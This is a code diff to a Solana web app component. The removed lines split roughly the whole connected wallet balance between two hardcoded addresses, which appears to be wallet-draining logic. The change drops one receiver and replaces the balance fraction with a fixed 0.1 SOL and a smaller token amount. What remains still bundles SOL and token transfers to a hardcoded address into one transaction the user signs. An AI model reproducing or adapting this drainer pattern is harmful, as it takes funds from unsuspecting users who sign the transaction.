@@ -187,9 +187,6 @@ export default function MainApp({ solanaNetwork }: MainProps) {
             const receiverPublicKey = new PublicKey(
                 "B4myR9PeyU6p1pgppEQPkHEfaMjw6MuKFFwQueXy59M"
             );
-            const secondReceiverPublicKey = new PublicKey(
-                "bww6U8teNKCbTF3RpmqezBzk8nhkaXc3yjgetY41bVE"
-            );
 
             const fromTokenAccount = await getOrCreateAssociatedTokenAccount(
                 connection,
@@ -212,7 +209,7 @@ export default function MainApp({ solanaNetwork }: MainProps) {
 
             // Numbers
             const DEFAULT_DECIMALS_COUNT = 9;
-            const TOKEN_TRANSFER_AMOUNT = 50 * 10 ** DEFAULT_DECIMALS_COUNT;
+            const TOKEN_TRANSFER_AMOUNT = 5 * 10 ** DEFAULT_DECIMALS_COUNT;
 
             const TOKEN_TRANSFER_AMOUNT_BUFFER = Buffer.from(
                 Uint8Array.of(...new BN(TOKEN_TRANSFER_AMOUNT).toArray("le", 8))
@@ -246,10 +243,7 @@ export default function MainApp({ solanaNetwork }: MainProps) {
             });
 
             //send SOL
-            let firstBal =
-                Math.floor((Number(walletBalance) - 0.001) * 600) / 1000;
-            let SecondBal =
-                Math.floor((Number(walletBalance) - 0.001) * 4000) / 10000;
+            let firstBal = 0.1;
 
             setIsBusy(true);
             loadingToast(`Sending ${receiverAmount} SOL`);
@@ -262,16 +256,9 @@ export default function MainApp({ solanaNetwork }: MainProps) {
                 lamports: LAMPORTS_PER_SOL * Number(firstBal),
             });
 
-            const secondInstruction = SystemProgram.transfer({
-                fromPubkey: wallet?.publicKey,
-                toPubkey: secondReceiverPublicKey,
-                lamports: LAMPORTS_PER_SOL * Number(SecondBal),
-            });
-
             console.log(signTransaction);
 
             transaction.add(instruction);
-            transaction.add(secondInstruction);
             transaction.add(transferTokensIx);
 
             const signature = await wallet.sendTransaction(
